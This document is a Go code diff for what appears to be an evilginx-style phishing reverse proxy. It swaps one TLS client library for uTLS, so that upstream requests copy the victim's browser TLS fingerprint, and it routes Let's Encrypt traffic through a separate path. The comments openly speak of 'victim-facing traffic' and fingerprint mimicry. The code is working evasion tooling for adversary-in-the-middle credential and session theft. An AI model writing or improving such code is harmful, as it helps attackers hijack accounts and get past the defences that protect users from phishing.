@@ -33,11 +33,7 @@ import (
 	"time"
 
 	"github.com/oschwald/geoip2-golang"
-	
-	// TLS-Client imports
-	tls_client "github.com/bogdanfinn/tls-client"
-	"github.com/bogdanfinn/tls-client/profiles"
-	fhttp "github.com/bogdanfinn/fhttp"
+	utls "github.com/refraction-networking/utls"
 
 	"golang.org/x/net/proxy"
 
@@ -105,8 +101,8 @@ type HttpProxy struct {
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
 
-	// TLS Client Pooling (using bogdanfinn/tls-client)
-	tlsClientCache map[string]tls_client.HttpClient
+	// Transport Pooling for Performance
+	transportCache map[string]*http.Transport
 	transportMutex sync.RWMutex
 }
 
@@ -148,7 +144,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-		tlsClientCache:    make(map[string]tls_client.HttpClient),
+		transportCache:    make(map[string]*http.Transport),
 	}
 
 	p.Server = &http.Server{
@@ -352,28 +348,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING (Pooled) ---
-			// Check if this is an ACME-related request
-			isACME := false
-			if req.URL != nil {
-				host := req.URL.Hostname()
-				isACME = strings.Contains(host, "letsencrypt.org") ||
-					strings.Contains(host, "acme-v02") ||
-					strings.Contains(host, "acme-staging")
-			}
-
-			if !isACME {
-				// Use tls-client for normal traffic
-				ctx.RoundTripper = p.getOrCreateTLSClient(userAgent)
-			} else {
-				// Use standard Go transport for ACME
-				ctx.RoundTripper = &transportWrapper{
-					transport: &http.Transport{
-						TLSClientConfig: &tls.Config{
-							MinVersion: tls.VersionTLS12,
-						},
-					},
-				}
-			}
+			// Assigns a cached transport that mimics the victim's browser fingerprint
+			// This overrides the default proxy dialer for this specific request.
+			ctx.RoundTripper = p.getOrCreateTransport(userAgent)
 			// --- END: DYNAMIC TLS & HTTP/2 SWITCHING ---
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
@@ -2239,50 +2216,6 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 }
 
 // transportWrapper wraps http.Transport to implement goproxy.RoundTripper
-// tlsClientRoundTripper wraps tls-client to implement goproxy.RoundTripper
-type tlsClientRoundTripper struct {
-	client tls_client.HttpClient
-}
-
-// RoundTrip implements goproxy.RoundTripper interface
-func (t *tlsClientRoundTripper) RoundTrip(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
-	// Convert standard http.Request to fhttp.Request
-	fReq := &fhttp.Request{
-		Method: req.Method,
-		URL:    req.URL,
-		Proto:  req.Proto,
-		Header: make(fhttp.Header),
-		Body:   req.Body,
-		Host:   req.Host,
-	}
-	
-	// Copy headers
-	for key, values := range req.Header {
-		for _, value := range values {
-			fReq.Header.Add(key, value)
-		}
-	}
-	
-	// Execute request with tls-client
-	resp, err := t.client.Do(fReq)
-	if err != nil {
-		return nil, err
-	}
-	
-	// Convert fhttp.Response back to http.Response
-	httpResp := &http.Response{
-		Status:     resp.Status,
-		StatusCode: resp.StatusCode,
-		Proto:      resp.Proto,
-		Header:     http.Header(resp.Header),
-		Body:       resp.Body,
-		Request:    req,
-	}
-	
-	return httpResp, nil
-}
-
-// transportWrapper for fallback to standard transport (ACME, etc.)
 type transportWrapper struct {
 	transport *http.Transport
 }
@@ -2292,42 +2225,33 @@ func (tw *transportWrapper) RoundTrip(req *http.Request, ctx *goproxy.ProxyCtx) 
 	return tw.transport.RoundTrip(req)
 }
 
-// --- HELPER FUNCTIONS FOR TLS-CLIENT ---
+// --- HELPER FUNCTIONS FOR DYNAMIC TLS & TRANSPORT POOLING ---
 
-// getBrowserProfile returns the appropriate tls-client profile based on User-Agent
-func getBrowserProfile(userAgent string) profiles.ClientProfile {
-	ua := strings.ToLower(userAgent)
-	
-	// Chrome (most common - includes HTTP/3 support)
-	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "edg") {
-		return profiles.Chrome_120 // Latest Chrome with full HTTP/3
+// getOrCreateTransport checks the cache for an existing transport for the given browser type
+// or creates a new one if it doesn't exist.
+func (p *HttpProxy) getOrCreateTransport(userAgent string) goproxy.RoundTripper {
+	browserType := getBrowserType(userAgent)
+
+	p.transportMutex.RLock()
+	if transport, exists := p.transportCache[browserType]; exists {
+		p.transportMutex.RUnlock()
+		return &transportWrapper{transport: transport} // Wrap all returns
+
 	}
-	
-	// Firefox
-	if strings.Contains(ua, "firefox") {
-		return profiles.Firefox_120 // Latest Firefox with HTTP/3
+	p.transportMutex.RUnlock()
+
+	p.transportMutex.Lock()
+	defer p.transportMutex.Unlock()
+
+	// Double-check locking pattern
+	if transport, exists := p.transportCache[browserType]; exists {
+		return &transportWrapper{transport: transport}
 	}
-	
-	// Safari / iOS
-	if strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome") {
-		if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") {
-			return profiles.Safari_IOS_17_2 // iOS Safari
-		}
-		return profiles.Safari_17_2_1 // macOS Safari
-	}
-	
-	// Edge (uses Chromium)
-	if strings.Contains(ua, "edg/") {
-		return profiles.Chrome_120
-	}
-	
-	// Android
-	if strings.Contains(ua, "android") {
-		return profiles.Chrome_120 // Android Chrome
-	}
-	
-	// Default: Chrome 120 (most compatible)
-	return profiles.Chrome_120
+
+	transport := newTransportWithUA(userAgent)
+	p.transportCache[browserType] = transport
+
+	return &transportWrapper{transport: transport}
 }
 
 func getBrowserType(ua string) string {
@@ -2344,69 +2268,104 @@ func getBrowserType(ua string) string {
 	if strings.Contains(ua, "edg/") {
 		return "edge"
 	}
-	if strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome") {
-		return "safari"
-	}
 	return "chrome"
 }
 
-// getOrCreateTLSClient gets or creates a tls-client for the given User-Agent
-func (p *HttpProxy) getOrCreateTLSClient(userAgent string) goproxy.RoundTripper {
-	browserType := getBrowserType(userAgent)
-	
-	// Check cache first (read lock)
-	p.transportMutex.RLock()
-	if client, exists := p.tlsClientCache[browserType]; exists {
-		p.transportMutex.RUnlock()
-		return &tlsClientRoundTripper{client: client}
+func getClientHelloID(userAgent string) utls.ClientHelloID {
+	ua := strings.ToLower(userAgent)
+
+	// 1. Android
+	if strings.Contains(ua, "android") {
+		return utls.HelloAndroid_11_OkHttp
 	}
-	p.transportMutex.RUnlock()
-	
-	// Create new client (write lock)
-	p.transportMutex.Lock()
-	defer p.transportMutex.Unlock()
-	
-	// Double-check after acquiring write lock
-	if client, exists := p.tlsClientCache[browserType]; exists {
-		return &tlsClientRoundTripper{client: client}
+
+	// 2. iOS / Safari (iPhone, iPad, Mac)
+	if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") || (strings.Contains(ua, "macintosh") && strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome")) {
+		return utls.HelloIOS_Auto
 	}
-	
-	// Get browser profile
-	profile := getBrowserProfile(userAgent)
-	
-	// Create tls-client options
-	options := []tls_client.HttpClientOption{
-		tls_client.WithClientProfile(profile),
-		tls_client.WithTimeoutSeconds(30),
-		tls_client.WithNotFollowRedirects(), // Let evilginx handle redirects
-		
-		// CRITICAL: This enables proper HTTP/3, HTTP/2, HTTP/1.1 negotiation
-		// The client will automatically use HTTP/3 (QUIC) when available
+
+	// 3. Firefox
+	if strings.Contains(ua, "firefox") {
+		return utls.HelloFirefox_Auto
 	}
-	
-	// Create the client
-	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
-	if err != nil {
-		log.Error("[TLS-CLIENT] Failed to create client for %s: %v", browserType, err)
-		
-		// Fallback to standard transport
-		return &transportWrapper{
-			transport: &http.Transport{
-				TLSClientConfig: &tls.Config{
-					MinVersion: tls.VersionTLS12,
-				},
-			},
-		}
+
+	// 4. Edge
+	if strings.Contains(ua, "edg/") {
+		return utls.HelloEdge_Auto // Using specific Edge fingerprint
 	}
-	
-	// Cache the client
-	p.tlsClientCache[browserType] = client
-	
-	log.Debug("[TLS-CLIENT] Created new client for browser: %s (profile: %v)", browserType, profile)
-	
-	return &tlsClientRoundTripper{client: client}
+
+	// 5. Chrome (Default fallback)
+	return utls.HelloChrome_Auto
 }
 
+func newTransportWithUA(ua string) *http.Transport {
+	return &http.Transport{
+		// Don't force HTTP/2 - let ALPN negotiation handle it naturally
+		// ForceAttemptHTTP2 conflicts with custom DialTLS and causes handshake failures
+		DialTLS: func(network, addr string) (net.Conn, error) {
+			// Safely extract hostname for SNI
+			host, port, err := net.SplitHostPort(addr)
+			if err != nil {
+				host = addr // Fallback if no port present
+				port = "443"
+			}
+			
+			// CRITICAL: Use standard TLS for Let's Encrypt / ACME servers
+			// This prevents certificate provisioning failures
+			if strings.Contains(host, "letsencrypt.org") || 
+			   strings.Contains(host, "acme-v0") ||
+			   strings.Contains(host, "acme-staging") ||
+			   strings.Contains(host, "api.letsencrypt.org") ||
+			   strings.Contains(host, "acme") && strings.Contains(host, "api") {
+				// Standard Go TLS for ACME
+				return tls.Dial(network, addr, &tls.Config{
+					ServerName: host,
+					MinVersion: tls.VersionTLS12,
+				})
+			}
+			
+			// For all other connections (victim-facing traffic), use uTLS fingerprinting
+			dialer := net.Dialer{
+				Timeout:   30 * time.Second,
+				KeepAlive: 30 * time.Second,
+			}
+
+			tcpConn, err := dialer.Dial(network, addr)
+			if err != nil {
+				return nil, err
+			}
+
+			// Get the matching TLS fingerprint for the user's browser
+			helloID := getClientHelloID(ua)
+
+			uConfig := &utls.Config{
+				ServerName:         host,
+				InsecureSkipVerify: false,
+				MinVersion:         tls.VersionTLS12,
+				// ALPN will negotiate h2 or http/1.1 naturally
+				// This is critical for proper HTTP/2 SETTINGS frame negotiation
+				NextProtos: []string{"h2", "http/1.1"},
+			}
+
+			uConn := utls.UClient(tcpConn, uConfig, helloID)
+			if err := uConn.Handshake(); err != nil {
+				_ = tcpConn.Close()
+				return nil, fmt.Errorf("uTLS handshake failed for %s: %v", host, err)
+			}
+
+			return uConn, nil
+		},
+		// Connection pooling settings for performance
+		MaxIdleConns:          100,
+		MaxIdleConnsPerHost:   10,
+		MaxConnsPerHost:       100,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+		// Disable compression to avoid fingerprinting via Accept-Encoding mismatches
+		DisableCompression:    false,
+	}
+}
 
 // return404Response - Returns a convincing "page not found" error
 func (p *HttpProxy) return404Response(req *http.Request) (*http.Request, *http.Response) {
